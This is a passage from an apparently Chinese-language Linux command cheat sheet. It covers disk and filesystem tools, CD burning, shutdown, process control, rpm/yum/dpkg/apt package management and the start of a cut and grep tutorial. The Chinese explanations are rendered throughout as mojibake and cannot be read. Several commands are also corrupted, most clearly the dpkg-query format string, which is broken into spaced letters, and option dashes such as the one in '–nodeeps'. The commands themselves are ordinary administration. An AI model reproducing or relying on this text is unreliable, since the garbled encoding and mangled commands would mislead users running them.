å…³é—­äº¤æ¢åˆ†åŒºã€‚sync å°†å†…å­˜ç¼“å†²åŒºå†…çš„æ•°æ®å†™å…¥ç£ç›˜ã€‚resize2fs è°ƒæ•´ext2&#x2F;ext3&#x2F;ext4ç­‰æ–‡ä»¶ç³»ç»Ÿå¤§å°ã€‚ du è®¡ç®—ç£ç›˜ç©ºé—´ä½¿ç”¨æƒ…å†µã€‚du -sh &#x2F;mnt&#x2F;cdrom&#x2F;packagesç»Ÿè®¡æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„å¤§å°du -cks * | sort -rn | head -n 10 ##æ‰¾å‡ºå ç”¨ç©ºé—´æœ€å¤šçš„æ–‡ä»¶æˆ–ç›®å½•ï¼šdu -sh dir1 ä¼°ç®—ç›®å½• â€˜dir1â€™ å·²ç»ä½¿ç”¨çš„ç£ç›˜ç©ºé—´â€™du -sk * | sort -rn ä»¥å®¹é‡å¤§å°ä¸ºä¾æ®ä¾æ¬¡æ˜¾ç¤ºæ–‡ä»¶å’Œç›®å½•çš„å¤§å°1234ls -lSr |more ä»¥å°ºå¯¸å¤§å°æ’åˆ—æ–‡ä»¶å’Œç›®å½•rpm -q -a â€“qf â€˜%10{SIZE}t%{NAME}nâ€™ | sort -k1,1n ä»¥å¤§å°ä¸ºä¾æ®ä¾æ¬¡æ˜¾ç¤ºå·²å®‰è£…çš„rpmåŒ…æ‰€ä½¿ç”¨çš„ç©ºé—´ (fedora, redhatç±»ç³»ç»Ÿ)dpkg-query -W -f&#x3D;â€˜I n s t a l l e d âˆ’ S i z e ; 10 t {Installed-Size;10}tInstalledâˆ’Size;10t{Package}nâ€™ | sort -k1,1n ä»¥å¤§å°ä¸ºä¾æ®æ˜¾ç¤ºå·²å®‰è£…çš„debåŒ…æ‰€ä½¿ç”¨çš„ç©ºé—´ (ubuntu, debianç±»ç³»ç»Ÿ) df æŠ¥å‘Šæ–‡ä»¶ç³»ç»Ÿç£ç›˜ç©ºé—´ä½¿ç”¨æƒ…å†µã€‚df -h æŸ¥çœ‹ç£ç›˜çš„ç©ºé—´1ç£ç›˜I&#x2F;Oè´Ÿè½½#iostat -x 1 2 &#x2F;&#x2F;æ£€æŸ¥I&#x2F;Oä½¿ç”¨ç‡(%util)æ˜¯å¦è¶…è¿‡100% å…‰ç›˜æ“ä½œå…‰ç›˜ cdrecord -v gracetime&#x3D;2 dev&#x3D;&#x2F;dev&#x2F;cdrom -eject blank&#x3D;fast -force æ¸…ç©ºä¸€ä¸ªå¯å¤å†™çš„å…‰ç›˜å†…å®¹mkisofs &#x2F;dev&#x2F;cdrom &gt; cd.iso åœ¨ç£ç›˜ä¸Šåˆ›å»ºä¸€ä¸ªå…‰ç›˜çš„isoé•œåƒæ–‡ä»¶mkisofs &#x2F;dev&#x2F;cdrom | gzip &gt; cd_iso.gz åœ¨ç£ç›˜ä¸Šåˆ›å»ºä¸€ä¸ªå‹ç¼©äº†çš„å…‰ç›˜isoé•œåƒæ–‡ä»¶mkisofs -J -allow-leading-dots -R -V â€œLabel CDâ€ -iso-level 4 -o .&#x2F;cd.iso data_cd åˆ›å»ºä¸€ä¸ªç›®å½•çš„isoé•œåƒæ–‡ä»¶cdrecord -v dev&#x3D;&#x2F;dev&#x2F;cdrom cd.iso åˆ»å½•ä¸€ä¸ªISOé•œåƒæ–‡ä»¶gzip -dc cd_iso.gz | cdrecord dev&#x3D;&#x2F;dev&#x2F;cdrom - åˆ»å½•ä¸€ä¸ªå‹ç¼©äº†çš„ISOé•œåƒæ–‡ä»¶mount -o loop cd.iso &#x2F;mnt&#x2F;iso æŒ‚è½½ä¸€ä¸ªISOé•œåƒæ–‡ä»¶cd-paranoia -B ä»ä¸€ä¸ªCDå…‰ç›˜è½¬å½•éŸ³è½¨åˆ° wav æ–‡ä»¶ä¸­cd-paranoia â€“ â€œ-3â€ ä»ä¸€ä¸ªCDå…‰ç›˜è½¬å½•éŸ³è½¨åˆ° wav æ–‡ä»¶ä¸­ï¼ˆå‚æ•°-3ï¼‰cdrecord â€“scanbus æ‰«ææ€»çº¿ä»¥è¯†åˆ«scsié€šé“dd if&#x3D;&#x2F;dev&#x2F;hdc | md5sum æ ¡éªŒä¸€ä¸ªè®¾å¤‡çš„md5sumç¼–ç ï¼Œä¾‹å¦‚ä¸€å¼  CD æ–‡ä»¶ç³»ç»Ÿå…¶ä»–badblocks -v &#x2F;dev&#x2F;hda1 æ£€æŸ¥ç£ç›˜hda1ä¸Šçš„åç£å—fsck &#x2F;dev&#x2F;hda1 ä¿®å¤&#x2F;æ£€æŸ¥hda1ç£ç›˜ä¸Šlinuxæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§fsck.ext2 &#x2F;dev&#x2F;hda1 ä¿®å¤&#x2F;æ£€æŸ¥hda1ç£ç›˜ä¸Šext2æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§e2fsck &#x2F;dev&#x2F;hda1 ä¿®å¤&#x2F;æ£€æŸ¥hda1ç£ç›˜ä¸Šext2æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§e2fsck -j &#x2F;dev&#x2F;hda1 ä¿®å¤&#x2F;æ£€æŸ¥hda1ç£ç›˜ä¸Šext3æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§fsck.ext3 &#x2F;dev&#x2F;hda1 ä¿®å¤&#x2F;æ£€æŸ¥hda1ç£ç›˜ä¸Šext3æ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§fsck.vfat &#x2F;dev&#x2F;hda1 ä¿®å¤&#x2F;æ£€æŸ¥hda1ç£ç›˜ä¸Šfatæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§fsck.msdos &#x2F;dev&#x2F;hda1 ä¿®å¤&#x2F;æ£€æŸ¥hda1ç£ç›˜ä¸Šdosæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§dosfsck &#x2F;dev&#x2F;hda1 ä¿®å¤&#x2F;æ£€æŸ¥hda1ç£ç›˜ä¸Šdosæ–‡ä»¶ç³»ç»Ÿçš„å®Œæ•´æ€§ åˆå§‹åŒ–ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿ mkfs &#x2F;dev&#x2F;hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿmke2fs &#x2F;dev&#x2F;hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªlinux ext2çš„æ–‡ä»¶ç³»ç»Ÿmke2fs -j &#x2F;dev&#x2F;hda1 åœ¨hda1åˆ†åŒºåˆ›å»ºä¸€ä¸ªlinux ext3(æ—¥å¿—å‹)çš„æ–‡ä»¶ç³»ç»Ÿmkfs -t vfat 32 -F &#x2F;dev&#x2F;hda1 åˆ›å»ºä¸€ä¸ª FAT32 æ–‡ä»¶ç³»ç»Ÿfdformat -n &#x2F;dev&#x2F;fd0 æ ¼å¼åŒ–ä¸€ä¸ªè½¯ç›˜mkswap &#x2F;dev&#x2F;hda3 åˆ›å»ºä¸€ä¸ªswapæ–‡ä»¶ç³»ç»Ÿ SWAPæ–‡ä»¶ç³»ç»Ÿ mkswap &#x2F;dev&#x2F;hda3 åˆ›å»ºä¸€ä¸ªswapæ–‡ä»¶ç³»ç»Ÿswapon &#x2F;dev&#x2F;hda3 å¯ç”¨ä¸€ä¸ªæ–°çš„swapæ–‡ä»¶ç³»ç»Ÿswapon &#x2F;dev&#x2F;hda2 &#x2F;dev&#x2F;hdb3 å¯ç”¨ä¸¤ä¸ªswapåˆ†åŒº 9ã€ç³»ç»Ÿå…¶å®ƒï¼ˆ25ä¸ªï¼‰echo æ‰“å°å˜é‡ï¼Œç›´æ¥è¾“å‡ºæŒ‡å®šçš„å­—ç¬¦ä¸²printf å°†ç»“æœæ ¼å¼åŒ–è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚rpm ç®¡ç†rpmåŒ…å‘½ä»¤ã€‚yum è‡ªåŠ¨åŒ–ç®€å•åŒ–åœ°ç®¡ç†rpmåŒ…çš„å‘½ä»¤ã€‚watch å‘¨æœŸçš„æ‰§è¡Œç»™å®šçš„å‘½ä»¤ï¼Œå¹¶å°†å‘½ä»¤çš„è¾“å‡ºä»¥å…¨å±æ–¹å¼æ˜¾ç¤ºã€‚alias è®¾ç½®ç³»ç»Ÿåˆ«åã€‚unalias å–æ¶ˆç³»ç»Ÿåˆ«åã€‚date æŸ¥çœ‹ã€è®¾ç½®ç³»ç»Ÿæ—¶é—´ã€‚clear æ¸…é™¤å±å¹•ï¼Œç®€ç§°æ¸…å±ã€‚history æŸ¥çœ‹å‘½ä»¤æ‰§è¡Œçš„å†å²çºªå½•ã€‚eject å¼¹å‡ºå…‰é©±ã€‚time è®¡ç®—å‘½ä»¤æ‰§è¡Œæ—¶é—´ã€‚nc åŠŸèƒ½å¼ºå¤§ç½‘ç»œå·¥å…·ã€‚xargs å°†æ ‡å‡†è¾“å…¥è½¬æ¢æˆå‘½ä»¤è¡Œçš„å‚æ•°ã€‚exec è°ƒç”¨å¹¶æ‰§è¡ŒæŒ‡ä»¤çš„å‘½ä»¤ã€‚export è®¾ç½®æˆ–è€…æ˜¾ç¤ºç¯å¢ƒå˜é‡ã€‚unset åˆ é™¤å˜é‡ã€å‡½æ•°ã€‚type ç”¨äºåˆ¤æ–­å¦å¤–ä¸€ä¸ªå‘½ä»¤æ˜¯å¦ä¸ºå†…ç½®çš„å‘½ä»¤ã€‚bc å‘½ä»¤è¡Œç§‘å­¦è®¡ç®—å™¨ç³»ç»Ÿç®¡ç†ã€æ€§èƒ½ç›‘è§†å‘½ä»¤ï¼ˆ9ä¸ªï¼‰chkconfig ç®¡ç†Linuxç³»ç»Ÿå¼€æœºå¯åŠ¨é¡¹ã€‚vmstat è™šæ‹Ÿå†…å­˜ç»Ÿè®¡ã€‚mpstat æ˜¾ç¤ºå„ä¸ªå¯ç”¨CPUçš„çŠ¶æ€ç»Ÿè®¡ã€‚iostat ç»Ÿè®¡ç³»ç»Ÿçš„IOã€‚sar å…¨é¢åœ°è·å–ç³»ç»ŸCPUã€è¿è¡Œé˜Ÿåˆ—ã€ç£ç›˜è¯»å†™ã€åˆ†é¡µã€å†…å­˜ã€ CPUä¸­æ–­å’Œç½‘ç»œæ€§èƒ½æ•°æ®ã€‚ipcs ç”¨äºæŠ¥å‘ŠLinuxä¸­è¿›ç¨‹é—´é€šä¿¡è®¾æ–½çš„çŠ¶æ€ï¼Œæ˜¾ç¤ºä¿¡æ¯åŒ…æ‹¬æ¶ˆæ¯åˆ—è¡¨ã€å…±äº«å†…å­˜å’Œä¿¡å·é‡ä¿¡æ¯ã€‚ipcrm ç”¨æ¥åˆ é™¤ä¸€ä¸ªæˆ–æ›´å¤šçš„æ¶ˆæ¯é˜Ÿåˆ—ã€ä¿¡å·é‡é›†æˆ–è€…å…±äº«å†…å­˜æ ‡è¯†ã€‚strace ç”¨äºè¯Šæ–­ã€è°ƒè¯•Linuxç”¨æˆ·ç©ºé—´è·Ÿè¸ªå™¨ã€‚æˆ‘ä»¬ç”¨å®ƒæ¥ç›‘æ§ç”¨æˆ·ç©ºé—´è¿›ç¨‹å’Œå†…æ ¸äº¤äº’ï¼Œæ¯”å¦‚ç³»ç»Ÿè°ƒç”¨ã€ä¿¡å·ä¼ é€’ã€è¿›ç¨‹çŠ¶æ€å˜æ›´ã€‚ltrace å‘½ä»¤ä¼šè·Ÿè¸ªè¿›ç¨‹åº“å‡½æ•°è°ƒç”¨ï¼Œå®ƒä¼šæ˜¾ç°å“ªä¸ªåº“å‡½æ•°è¢«è°ƒç”¨ã€‚shutdown å…³æœºã€‚shutdown -h now å…³é—­ç³»ç»Ÿinit 0 å…³é—­ç³»ç»Ÿtelinit 0 å…³é—­ç³»ç»Ÿshutdown -h hours:minutes &amp; æŒ‰é¢„å®šæ—¶é—´å…³é—­ç³»ç»Ÿshutdown -c å–æ¶ˆæŒ‰é¢„å®šæ—¶é—´å…³é—­ç³»ç»Ÿshutdown -r now é‡å¯reboot é‡å¯(2)logout æ³¨é”€halt å…³æœºã€‚poweroff å…³é—­ç”µæºã€‚logout é€€å‡ºå½“å‰ç™»å½•çš„Shellã€‚exit é€€å‡ºå½“å‰ç™»å½•çš„Shellã€‚Ctrl+d é€€å‡ºå½“å‰ç™»å½•çš„Shellçš„å¿«æ·é”®ã€‚è¿›ç¨‹ç®¡ç†ç›¸å…³å‘½ä»¤ï¼ˆ15ä¸ªï¼‰bg å°†ä¸€ä¸ªåå°æš‚åœçš„å‘½ä»¤ï¼Œå˜æˆç»§ç»­æ‰§è¡Œã€‚fg å°†åå°çš„å‘½ä»¤è°ƒè‡³å‰å°ç»§ç»­è¿è¡Œã€‚jobs æŸ¥çœ‹å½“å‰æœ‰å¤šå°‘åå°è¿è¡Œçš„å‘½ä»¤ã€‚kill ç»ˆæ­¢è¿›ç¨‹ã€‚killall é€šè¿‡è¿›ç¨‹åæ¥ç»ˆæ­¢è¿›ç¨‹ã€‚pkill é€šè¿‡è¿›ç¨‹åæ¥ç»ˆæ­¢è¿›ç¨‹ã€‚crontab å®šæ—¶ä»»åŠ¡å‘½ä»¤ã€‚ps æ˜¾ç¤ºè¿›ç¨‹å¿«ç…§ã€‚pstree æ ‘å½¢æ˜¾ç¤ºè¿›ç¨‹ã€‚nice&#x2F;renice è°ƒæ•´ç¨‹åºè¿è¡Œçš„ä¼˜å…ˆçº§ã€‚nohup å¿½ç•¥æŒ‚èµ·ä¿¡å·è¿è¡ŒæŒ‡å®šã€‚pgrep æŸ¥æ‰¾åŒ¹é…æ¡ä»¶è¿›ç¨‹ã€‚runlevel æŸ¥çœ‹ç³»ç»Ÿå½“å‰è¿è¡Œçº§åˆ«ã€‚init åˆ‡æ¢è¿è¡Œçº§åˆ«ã€‚service å¯åŠ¨ã€åœæ­¢ã€é‡æ–°å¯åŠ¨ã€å…³é—­ç³»ç»ŸæœåŠ¡ï¼Œè¿˜å¯ä»¥æ˜¾ç¤ºæ‰€æœ‰ç³»ç»ŸæœåŠ¡çš„å½“å‰çŠ¶æ€ã€‚ è½¯ä»¶å®‰è£…å‘½ä»¤1ï¼‰RPM åŒ… - ï¼ˆFedora, RedhatåŠç±»ä¼¼ç³»ç»Ÿï¼‰rpm -ivh package.rpm å®‰è£…ä¸€ä¸ªrpmåŒ…rpm -ivh â€“nodeeps package.rpm å®‰è£…ä¸€ä¸ªrpmåŒ…è€Œå¿½ç•¥ä¾èµ–å…³ç³»è­¦å‘Šrpm -U package.rpm æ›´æ–°ä¸€ä¸ªrpmåŒ…ä½†ä¸æ”¹å˜å…¶é…ç½®æ–‡ä»¶rpm -F package.rpm æ›´æ–°ä¸€ä¸ªç¡®å®šå·²ç»å®‰è£…çš„rpmåŒ…rpm -e package_name.rpm åˆ é™¤ä¸€ä¸ªrpmåŒ…rpm -qa æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»å®‰è£…çš„rpmåŒ…rpm -qa | grep httpd æ˜¾ç¤ºæ‰€æœ‰åç§°ä¸­åŒ…å« â€œhttpdâ€ å­—æ ·çš„rpmåŒ…rpm -qi package_name è·å–ä¸€ä¸ªå·²å®‰è£…åŒ…çš„ç‰¹æ®Šä¿¡æ¯rpm -qg â€œSystem Environment&#x2F;Daemonsâ€ æ˜¾ç¤ºä¸€ä¸ªç»„ä»¶çš„rpmåŒ…rpm -ql package_name æ˜¾ç¤ºä¸€ä¸ªå·²ç»å®‰è£…çš„rpmåŒ…æä¾›çš„æ–‡ä»¶åˆ—è¡¨rpm -qc package_name æ˜¾ç¤ºä¸€ä¸ªå·²ç»å®‰è£…çš„rpmåŒ…æä¾›çš„é…ç½®æ–‡ä»¶åˆ—è¡¨rpm -q package_name â€“whatrequires æ˜¾ç¤ºä¸ä¸€ä¸ªrpmåŒ…å­˜åœ¨ä¾èµ–å…³ç³»çš„åˆ—è¡¨rpm -q package_name â€“whatprovides æ˜¾ç¤ºä¸€ä¸ªrpmåŒ…æ‰€å çš„ä½“ç§¯rpm -q package_name â€“scripts æ˜¾ç¤ºåœ¨å®‰è£…&#x2F;åˆ é™¤æœŸé—´æ‰€æ‰§è¡Œçš„è„šæœ¬lrpm -q package_name â€“changelog æ˜¾ç¤ºä¸€ä¸ªrpmåŒ…çš„ä¿®æ”¹å†å²rpm -qf &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf ç¡®è®¤æ‰€ç»™çš„æ–‡ä»¶ç”±å“ªä¸ªrpmåŒ…æ‰€æä¾›rpm -qp package.rpm -l æ˜¾ç¤ºç”±ä¸€ä¸ªå°šæœªå®‰è£…çš„rpmåŒ…æä¾›çš„æ–‡ä»¶åˆ—è¡¨rpm â€“import &#x2F;media&#x2F;cdrom&#x2F;RPM-GPG-KEY å¯¼å…¥å…¬é’¥æ•°å­—è¯ä¹¦rpm â€“checksig package.rpm ç¡®è®¤ä¸€ä¸ªrpmåŒ…çš„å®Œæ•´æ€§rpm -qa gpg-pubkey ç¡®è®¤å·²å®‰è£…çš„æ‰€æœ‰rpmåŒ…çš„å®Œæ•´æ€§rpm -V package_name æ£€æŸ¥æ–‡ä»¶å°ºå¯¸ã€ è®¸å¯ã€ç±»å‹ã€æ‰€æœ‰è€…ã€ç¾¤ç»„ã€MD5æ£€æŸ¥ä»¥åŠæœ€åä¿®æ”¹æ—¶é—´rpm -Va æ£€æŸ¥ç³»ç»Ÿä¸­æ‰€æœ‰å·²å®‰è£…çš„rpmåŒ…- å°å¿ƒä½¿ç”¨rpm -Vp package.rpm ç¡®è®¤ä¸€ä¸ªrpmåŒ…è¿˜æœªå®‰è£…rpm2cpio package.rpm | cpio â€“extract â€“make-directories bin ä»ä¸€ä¸ªrpmåŒ…è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶rpm -ivh &#x2F;usr&#x2F;src&#x2F;redhat&#x2F;RPMS&#x2F;arch&#x2F;package.rpm ä»ä¸€ä¸ªrpmæºç å®‰è£…ä¸€ä¸ªæ„å»ºå¥½çš„åŒ…rpmbuild â€“rebuild package_name.src.rpm ä»ä¸€ä¸ªrpmæºç æ„å»ºä¸€ä¸ª rpm åŒ… 2ï¼‰YUM è½¯ä»¶åŒ…å‡çº§å™¨ - ï¼ˆFedora, RedHatåŠç±»ä¼¼ç³»ç»Ÿï¼‰yum install package_name ä¸‹è½½å¹¶å®‰è£…ä¸€ä¸ªrpmåŒ…yum localinstall package_name.rpm å°†å®‰è£…ä¸€ä¸ªrpmåŒ…ï¼Œä½¿ç”¨ä½ è‡ªå·±çš„è½¯ä»¶ä»“åº“ä¸ºä½ è§£å†³æ‰€æœ‰ä¾èµ–å…³ç³»yum update package_name.rpm æ›´æ–°å½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰å®‰è£…çš„rpmåŒ…yum update package_name æ›´æ–°ä¸€ä¸ªrpmåŒ…yum remove package_name åˆ é™¤ä¸€ä¸ªrpmåŒ…yum list åˆ—å‡ºå½“å‰ç³»ç»Ÿä¸­å®‰è£…çš„æ‰€æœ‰åŒ…yum search package_name åœ¨rpmä»“åº“ä¸­æœå¯»è½¯ä»¶åŒ…yum clean packages æ¸…ç†rpmç¼“å­˜åˆ é™¤ä¸‹è½½çš„åŒ…yum clean headers åˆ é™¤æ‰€æœ‰å¤´æ–‡ä»¶yum clean all åˆ é™¤æ‰€æœ‰ç¼“å­˜çš„åŒ…å’Œå¤´æ–‡ä»¶ 3ï¼‰DEB åŒ… (Debian, Ubuntu ä»¥åŠç±»ä¼¼ç³»ç»Ÿ)dpkg -i package.deb å®‰è£…&#x2F;æ›´æ–°ä¸€ä¸ª deb åŒ…dpkg -r package_name ä»ç³»ç»Ÿåˆ é™¤ä¸€ä¸ª deb åŒ…dpkg -l æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰å·²ç»å®‰è£…çš„ deb åŒ…dpkg -l | grep httpd æ˜¾ç¤ºæ‰€æœ‰åç§°ä¸­åŒ…å« â€œhttpdâ€ å­—æ ·çš„debåŒ…dpkg -s package_name è·å¾—å·²ç»å®‰è£…åœ¨ç³»ç»Ÿä¸­ä¸€ä¸ªç‰¹æ®ŠåŒ…çš„ä¿¡æ¯dpkg -L package_name æ˜¾ç¤ºç³»ç»Ÿä¸­å·²ç»å®‰è£…çš„ä¸€ä¸ªdebåŒ…æ‰€æä¾›çš„æ–‡ä»¶åˆ—è¡¨dpkg â€“contents package.deb æ˜¾ç¤ºå°šæœªå®‰è£…çš„ä¸€ä¸ªåŒ…æ‰€æä¾›çš„æ–‡ä»¶åˆ—è¡¨dpkg -S &#x2F;bin&#x2F;ping ç¡®è®¤æ‰€ç»™çš„æ–‡ä»¶ç”±å“ªä¸ªdebåŒ…æä¾› 4ï¼‰APT è½¯ä»¶å·¥å…· (Debian, Ubuntu ä»¥åŠç±»ä¼¼ç³»ç»Ÿ)apt-get install package_name å®‰è£…&#x2F;æ›´æ–°ä¸€ä¸ª deb åŒ…apt-cdrom install package_name ä»å…‰ç›˜å®‰è£…&#x2F;æ›´æ–°ä¸€ä¸ª deb åŒ…apt-get update å‡çº§åˆ—è¡¨ä¸­çš„è½¯ä»¶åŒ…apt-get upgrade å‡çº§æ‰€æœ‰å·²å®‰è£…çš„è½¯ä»¶apt-get remove package_name ä»ç³»ç»Ÿåˆ é™¤ä¸€ä¸ªdebåŒ…apt-get check ç¡®è®¤ä¾èµ–çš„è½¯ä»¶ä»“åº“æ­£ç¡®apt-get clean ä»ä¸‹è½½çš„è½¯ä»¶åŒ…ä¸­æ¸…ç†ç¼“å­˜apt-cache search searched-package è¿”å›åŒ…å«æ‰€è¦æœç´¢å­—ç¬¦ä¸²çš„è½¯ä»¶åŒ…åç§° 10ã€å››å‰‘å®¢åŠé«˜çº§ï¼ˆgrepï¼Œsedï¼Œawkï¼Œcutï¼Œç®¡é“ï¼Œxargsï¼‰10.1 cutï¼šä»¥åˆ†éš”ç¬¦æˆªå–åˆ—ï¼ˆåˆ†æ®µï¼‰è¯´æ˜ï¼šcutå‘½ä»¤ç”¨äºè¯»å–æ–‡ä»¶çš„æ¯ä¸€è¡ŒæŒ‰åˆ†éš”ç¬¦è·å–æŒ‡å®šå­—èŠ‚ã€å­—ç¬¦å’Œå­—æ®µæ•°å¹¶å°†è¿™äº›å­—èŠ‚ã€å­—ç¬¦å’Œå­—æ®µå†™è‡³æ ‡å‡†è¾“å‡ºã€‚æˆ‘ä»¬æŠŠcutmå‘½ä»¤ï¼Œå¯ç®€å•è®¤ä¸ºæ˜¯å¯¹è¡Œæ•°æ®çš„å¤„ç†ã€‚å®˜æ–¹é‡Šä¹‰ï¼šremove sections from each line of filesï¼ˆæˆªå–æ¯è¡Œåˆ†æ®µï¼‰ï¼›å¦‚æœä¸æŒ‡å®š File å‚æ•°ï¼Œcut å‘½ä»¤å°†è¯»å–æ ‡å‡†è¾“å…¥ã€‚å¿…é¡»æŒ‡å®š -bã€-c æˆ– -f æ ‡å¿—ä¹‹ä¸€ã€‚ è¯­æ³•ï¼š cut OPTIONâ€¦ [FILE]â€¦cut [-bn] [file]cut [-c] [file]cut [-df] [file]1234å‚æ•°ï¼š -b ï¼šä»¥å­—èŠ‚ä¸ºå•ä½è¿›è¡Œåˆ†å‰²ã€‚è¿™äº›å­—èŠ‚ä½ç½®å°†å¿½ç•¥å¤šå­—èŠ‚å­—ç¬¦è¾¹ç•Œï¼Œé™¤éä¹ŸæŒ‡å®šäº† -n æ ‡å¿—ã€‚-c ï¼šä»¥å­—ç¬¦ä¸ºå•ä½è¿›è¡Œåˆ†å‰²ã€‚-d ï¼šè‡ªå®šä¹‰åˆ†éš”ç¬¦ï¼Œé»˜è®¤ä¸ºåˆ¶è¡¨ç¬¦(TAB)ã€‚-f ï¼šä¸-dä¸€èµ·ä½¿ç”¨ï¼ŒæŒ‡å®šæ˜¾ç¤ºå“ªä¸ªåŒºåŸŸï¼Œå³æŒ‡å®šå“ªä¸€ä¸ªå­—æ®µè¿›è¡Œæå–ã€‚ã€‚-n ï¼šå–æ¶ˆåˆ†å‰²å¤šå­—èŠ‚å­—ç¬¦ã€‚ä»…å’Œ -b æ ‡å¿—ä¸€èµ·ä½¿ç”¨ã€‚å¦‚æœå­—ç¬¦çš„æœ€åä¸€ä¸ªå­—èŠ‚è½åœ¨ç”± -b æ ‡å¿—çš„ List å‚æ•°æŒ‡ç¤ºçš„èŒƒå›´ä¹‹å†…ï¼Œè¯¥å­—ç¬¦å°†è¢«å†™å‡ºï¼›å¦åˆ™ï¼Œè¯¥å­—ç¬¦å°†è¢«æ’é™¤ eg1ï¼šcutæˆªå–ä»¥:åˆ†å‰²ä¿ç•™ç¬¬ä¸ƒæ®µï¼šgrep hadoop &#x2F;etc&#x2F;passwd | cut -d: -f7 &#x2F;&#x2F;åˆ†éš”ç¬¦ä¹Ÿå¯ä»¥å•å¼•å·å¼•èµ· eg2ï¼šä½¿ç”¨åˆ†éš”ç¬¦:æ‰“å°&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¸­æ¯ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªå­—æ®µcut -d â€˜:â€™ -f 1 &#x2F;etc&#x2F;passwd eg3ï¼šgrep â€˜&#x2F;bin&#x2F;bashâ€™ &#x2F;etc&#x2F;passwd| cut -d â€˜:â€™ -f 1,6 &#x2F;&#x2F;ä»&#x2F;etc&#x2F;passwdæ–‡ä»¶æå–ç¬¬ä¸€å’Œç¬¬å…­ä¸ªå­—æ®µ eg4ï¼šgrep â€˜&#x2F;bin&#x2F;bashâ€™ &#x2F;etc&#x2F;passwd|cut -d â€˜:â€™ -f 1-4,6,7 &#x2F;&#x2F;å–1-4è¿ç»­å­—æ®µçš„èŒƒå›´ï¼ŒæŒ‡å®šä»¥-åˆ†éš”çš„å¼€å§‹å­—æ®µå’Œç»“æŸå­—æ®µå³å¯ï¼› eg5ï¼šgrep â€˜&#x2F;bin&#x2F;bashâ€™ &#x2F;etc&#x2F;passwd|cut -d â€˜:â€™ â€“complement -f 2 &#x2F;&#x2F;â€“complementç”¨äºæ’é™¤&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¸­çš„ç¬¬äºŒä¸ªå­—æ®µ eg6ï¼šcut -d â€˜:â€™ -f1,7 â€“output-delimiter&#x3D;â€™ â€™ &#x2F;etc&#x2F;passwd|sort &#x2F;&#x2F;â€“output-delimiter&#x3D;â€™ â€˜ç”¨äºæŒ‡å®šè¾“å‡ºçš„åˆ†éš”ç¬¦ï¼Œé»˜è®¤è¾“å‡ºçš„ä¸ºcutå¤„ç†æ—¶çš„æŒ‡å®šåˆ†éš”ç¬¦ æ³¨ï¼šcutå‘½ä»¤ä¸€ä¸ªé™åˆ¶æ˜¯å®ƒä¸æ”¯æŒæŒ‡å®šå¤šä¸ªå­—ç¬¦ä½œä¸ºåˆ†éš”ç¬¦ã€‚å¤šä¸ªç©ºæ ¼è¢«è§†ä¸ºå¤šä¸ªå­—æ®µåˆ†éš”ç¬¦ï¼Œå¿…é¡»ä½¿ç”¨trå‘½ä»¤æ‰èƒ½å¾—åˆ°æ‰€éœ€çš„è¾“å‡ºã€‚ 10.2 grepæŸ¥è¯¢è¡¨è¾¾å¼åŒ¹é…åˆ°çš„å­—ç¬¦æˆ–å­—ç¬¦ä¸²grep -v hadoop &#x2F;etc&#x2F;passwd ##æŸ¥è¯¢ä¸åŒ…å«hadoopçš„è¡Œgrep â€˜hadoopâ€™ &#x2F;etc&#x2F;passwd ##ä¸€èˆ¬ç”¨å•å¼•å·ï¼Œå¦‚æœå†…éƒ¨æœ‰è½¬ç§»å­—ç¬¦çš„è¯ä¸”æƒ³ä¿ç•™è½¬ç§»å­—ç¬¦çš„æ„ä¹‰ï¼Œè¿™æ—¶ç”¨åŒå¼•å·ï¼›å•å¼•å·å±è”½ç‰¹æ®Šå­—ç¬¦çš„æ„ä¹‰ã€‚ grep â€˜h.pâ€™ &#x2F;etc&#x2F;passwd æ­£åˆ™è¡¨è¾¾(ç‚¹ä»£è¡¨ä»»æ„ä¸€ä¸ªå­—ç¬¦)grep â€˜^hadoopâ€™ &#x2F;etc&#x2F;passwd æ­£åˆ™è¡¨è¾¾ä»¥hadoopå¼€å¤´grep â€˜hadoop$â€™ &#x2F;etc&#x2F;passwd ä»¥hadoopç»“å°¾grep -v â€˜^#â€™ a.txt | grep -v â€˜^$â€™ æŸ¥æ‰¾ä¸æ˜¯ä»¥#å¼€å¤´çš„è¡Œgrep â€˜^[hr]â€™&#x2F;etc&#x2F;passwd ä»¥hæˆ–rå¼€å¤´çš„grep â€˜^[^hr]â€™ &#x2F;etc&#x2F;passwd ä¸æ˜¯ä»¥hå’Œrå¼€å¤´çš„grep â€˜^[^h-r]â€™ &#x2F;etc&#x2F;passwd ä¸æ˜¯ä»¥håˆ°rå¼€å¤´çš„grep [0-9] &#x2F;var&#x2F;log&#x2F;messages é€‰æ‹© â€˜&#x2F;var&#x2F;log&#x2F;messagesâ€™ æ–‡ä»¶ä¸­æ‰€æœ‰åŒ…å«æ•°å­—çš„è¡Œgrep Aug -R &#x2F;var&#x2F;log&#x2F; åœ¨ç›®å½• â€˜&#x2F;var&#x2F;logâ€™ åŠéšåçš„ç›®å½•ä¸­æœç´¢å­—ç¬¦ä¸²â€Augâ€123456789è§„åˆ™ï¼š . : ä»»æ„ä¸€ä¸ªå­—ç¬¦ a* : ä»»æ„å¤šä¸ªa(é›¶ä¸ªæˆ–å¤šä¸ªa) a? : é›¶ä¸ªæˆ–ä¸€ä¸ªa a+ : ä¸€ä¸ªæˆ–å¤šä¸ªa .* : 